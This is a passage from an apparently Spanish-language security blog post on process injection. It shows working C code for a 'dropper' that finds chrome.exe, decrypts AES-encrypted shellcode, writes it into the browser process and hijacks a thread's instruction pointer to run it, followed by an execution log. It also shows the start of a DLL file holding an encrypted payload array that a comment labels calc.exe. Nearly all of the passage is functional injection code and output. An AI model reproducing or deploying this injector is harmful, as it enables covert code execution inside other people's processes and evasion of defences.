	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptDecrypt</span><span class="p">(</span><span class="n">hKey</span><span class="p">,</span> <span class="p">(</span><span class="n">HCRYPTHASH</span><span class="p">)</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">BYTE</span> <span class="o">*</span><span class="p">)</span> <span class="n">payload</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">payload_len</span><span class="p">)){</span>
			<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="n">CryptReleaseContext</span><span class="p">(</span><span class="n">hProv</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
	<span class="n">CryptDestroyHash</span><span class="p">(</span><span class="n">hHash</span><span class="p">);</span>
	<span class="n">CryptDestroyKey</span><span class="p">(</span><span class="n">hKey</span><span class="p">);</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>


<span class="kt">int</span> <span class="nf">FindProcess</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">procname</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">HANDLE</span> <span class="n">hProcSnap</span><span class="p">;</span>
        <span class="n">PROCESSENTRY32</span> <span class="n">pe32</span><span class="p">;</span>
        <span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">hProcSnap</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPPROCESS</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span><span class="c1">//se crear un snapshot de los procesos en ejecución del sistema operativo</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">INVALID_HANDLE_VALUE</span> <span class="o">==</span> <span class="n">hProcSnap</span><span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">pe32</span><span class="p">.</span><span class="n">dwSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PROCESSENTRY32</span><span class="p">);</span> <span class="c1">// se obtiene el tamaño total del objeo definido     </span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">Process32First</span><span class="p">(</span><span class="n">hProcSnap</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe32</span><span class="p">))</span> <span class="p">{</span> <span class="c1">// validación del snapshot creado</span>
                <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProcSnap</span><span class="p">);</span>
                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">while</span> <span class="p">(</span><span class="n">Process32Next</span><span class="p">(</span><span class="n">hProcSnap</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe32</span><span class="p">))</span> <span class="p">{</span> <span class="c1">// iteración del snapshot</span>
				<span class="c1">//printf("[FindProcess: ] %s \n", pe32.szExeFile);</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">lstrcmpiA</span><span class="p">(</span><span class="n">procname</span><span class="p">,</span> <span class="n">pe32</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// comprobación del nombre del proceso</span>
                        <span class="n">pid</span> <span class="o">=</span> <span class="n">pe32</span><span class="p">.</span><span class="n">th32ProcessID</span><span class="p">;</span> <span class="c1">// obtención del pid del proceso</span>
						<span class="n">printf</span><span class="p">(</span><span class="s">"[FindProcess]: Process Found %s :"</span><span class="p">,</span> <span class="n">pe32</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">);</span>
						<span class="n">printf</span><span class="p">(</span><span class="s">" PID %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span>
                        <span class="k">break</span><span class="p">;</span>
                <span class="p">}</span>
        <span class="p">}</span>       
        <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProcSnap</span><span class="p">);</span> <span class="c1">//se cierra el snapshot       </span>
        <span class="k">return</span> <span class="n">pid</span><span class="p">;</span> <span class="c1">// retorno de pid</span>
<span class="p">}</span>


<span class="n">HANDLE</span> <span class="nf">FindThread</span><span class="p">(</span><span class="kt">int</span> <span class="n">pid</span><span class="p">){</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[FindThread] for pid %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span>
	<span class="n">HANDLE</span> <span class="n">hThread</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">THREADENTRY32</span> <span class="n">thEntry</span><span class="p">;</span>
	<span class="n">thEntry</span><span class="p">.</span><span class="n">dwSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">thEntry</span><span class="p">);</span>
    <span class="n">HANDLE</span> <span class="n">Snap</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPTHREAD</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
	<span class="k">while</span> <span class="p">(</span><span class="n">Thread32Next</span><span class="p">(</span><span class="n">Snap</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">thEntry</span><span class="p">))</span> <span class="p">{</span>
		<span class="c1">//printf("[FindThread] : %d \n", thEntry.th32OwnerProcessID);</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">thEntry</span><span class="p">.</span><span class="n">th32OwnerProcessID</span> <span class="o">==</span> <span class="n">pid</span><span class="p">)</span> 	<span class="p">{</span>
			<span class="n">printf</span><span class="p">(</span><span class="s">"[FindThread] : Thread found %d :"</span><span class="p">,</span> <span class="n">thEntry</span><span class="p">.</span><span class="n">th32ThreadID</span><span class="p">);</span>
			<span class="n">printf</span><span class="p">(</span><span class="s">" ProcessId %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">thEntry</span><span class="p">.</span><span class="n">th32OwnerProcessID</span><span class="p">);</span>
			<span class="n">hThread</span> <span class="o">=</span> <span class="n">OpenThread</span><span class="p">(</span><span class="n">THREAD_ALL_ACCESS</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">thEntry</span><span class="p">.</span><span class="n">th32ThreadID</span><span class="p">);</span>
			<span class="k">break</span><span class="p">;</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="n">CloseHandle</span><span class="p">(</span><span class="n">Snap</span><span class="p">);</span>
	
	<span class="k">return</span> <span class="n">hThread</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">Inject</span><span class="p">(</span><span class="kt">int</span> <span class="n">pid</span><span class="p">,</span> <span class="n">HANDLE</span> <span class="n">hProc</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">payload</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[Inject]: Inject Context Hijacking thread Of process %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span>
	<span class="n">HANDLE</span> <span class="n">hThread</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">LPVOID</span> <span class="n">pRemoteCode</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">CONTEXT</span> <span class="n">ctx</span><span class="p">;</span>
	<span class="n">hThread</span> <span class="o">=</span> <span class="n">FindThread</span><span class="p">(</span><span class="n">pid</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">hThread</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"Error, hijack unsuccessful.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="n">AESDecrypt</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">payload</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">key</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">key</span><span class="p">));</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[Inject]: Decrypt shellcode </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="n">pRemoteCode</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">hProc</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[Inject]: Allocate memory in external process </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">hProc</span><span class="p">,</span> <span class="n">pRemoteCode</span><span class="p">,</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)</span> <span class="n">payload</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span> <span class="n">payload_len</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span> <span class="o">*</span><span class="p">)</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[Inject]: Write shellcode </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="n">SuspendThread</span><span class="p">(</span><span class="n">hThread</span><span class="p">);</span>	
	<span class="n">printf</span><span class="p">(</span><span class="s">"[Inject]: Suspend Thread %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">hThread</span><span class="p">);</span>
	<span class="n">ctx</span><span class="p">.</span><span class="n">ContextFlags</span> <span class="o">=</span> <span class="n">CONTEXT_FULL</span><span class="p">;</span>
	<span class="n">GetThreadContext</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ctx</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[Inject]: Get Thread COntext %s </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ctx</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[Inject] Thread pRemoteCodeAddress : %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pRemoteCode</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[Inject] [Hijacking] Thread Rip Next execution instruction: %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ctx</span><span class="p">.</span><span class="n">Rip</span><span class="p">);</span>
	<span class="n">ctx</span><span class="p">.</span><span class="n">Rip</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD_PTR</span><span class="p">)</span> <span class="n">pRemoteCode</span><span class="p">;</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[Inject] [Hijacking] Thread Rip Next execution instruction: %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ctx</span><span class="p">.</span><span class="n">Rip</span><span class="p">);</span>
	<span class="n">SetThreadContext</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ctx</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[Inject]: Set ThreadContext And ResumeThread wait for execution ..... </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="k">return</span> <span class="n">ResumeThread</span><span class="p">(</span><span class="n">hThread</span><span class="p">);</span>	
<span class="p">}</span>


<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[Main] Init Dropper </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">HANDLE</span> <span class="n">hProc</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">pid</span> <span class="o">=</span> <span class="n">FindProcess</span><span class="p">(</span><span class="s">"chrome.exe"</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">pid</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[Main] Notepad.exe PID = %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span>
		<span class="n">hProc</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span> <span class="n">PROCESS_CREATE_THREAD</span> <span class="o">|</span> <span class="n">PROCESS_QUERY_INFORMATION</span> <span class="o">|</span> 
						<span class="n">PROCESS_VM_OPERATION</span> <span class="o">|</span> <span class="n">PROCESS_VM_READ</span> <span class="o">|</span> <span class="n">PROCESS_VM_WRITE</span><span class="p">,</span>
						<span class="n">FALSE</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span> <span class="n">pid</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">hProc</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">Inject</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="n">hProc</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">);</span>
			<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProc</span><span class="p">);</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[Main] End Dropper </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>


</code></pre></div></div>

<p>Salida de ejecución del proceso:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[Main] Init Dropper
[FindProcess]: Process Found chrome.exe : PID 60
[Main] chrome.exe PID = 60
[Inject]: Inject Context Hijacking thread Of process 60
[FindThread] for pid 60
[FindThread] : Thread found 1828 : ProcessId 60
[Inject]: Decrypt shellcode
[Inject]: Allocate memory in external process
[Inject]: Write shellcode
[Inject]: Suspend Thread 156
[Inject]: Get Thread COntext
[Inject] Thread pRemoteCodeAddress : 715325440
[Inject] [Hijacking] Thread Rip Next execution instruction: 242063620
[Inject] [Hijacking] Thread Rip Next execution instruction: 715325440
[Inject]: Set ThreadContext And ResumeThread wait for execution .....
[Main] End Dropper
</code></pre></div></div>
<p><img src="/assets/images/thread_context_execution.png" alt="Thread Context Execution" /></p>

<h2 id="dll-código-fuente">DLL Código fuente</h2>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;winternl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;tlhelp32.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;wincrypt.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;psapi.h&gt;</span><span class="cp">
#pragma comment (lib, "user32.lib")
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
</span>
<span class="c1">// calc.exe</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">payload</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x9c</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0xd</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0xfa</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x3b</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">,</span> <span class="mh">0xa0</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xb</span><span class="p">,</span> <span class="mh">0xf4</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0xce</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0xf3</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0xc6</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0xe</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0xfd</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0xd5</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0xd1</span><span class="p">,</span> <span class="mh">0xbe</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0xb6</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0xd3</span><span class="p">,</span> <span class="mh">0xd8</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x8f</span><span class="p">,</span> <span class="mh">0xa4</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x3e</span><span class="p">,</span> <span class="mh">0xc6</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0xd9</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x4b</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">,</span> <span class="mh">0x1d</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0xd6</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0xf4</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0xfc</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0xc3</span><span class="p">,</span> <span class="mh">0xe</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x1a</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x9c</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xd4</span><span class="p">,</span> <span class="mh">0xa7</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0xec</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x4f</span><span class="p">,</span> <span class="mh">0x4b</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0xf1</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0x6d</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0xa1</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x2</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span> <span class="mh">0x4d</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0xd1</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0xa9</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0xde</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0x6</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x7e</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x2a</span><span class="p">,</span> <span class="mh">0x92</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x3</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x8f</span> <span class="p">};</span>
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">);</span>
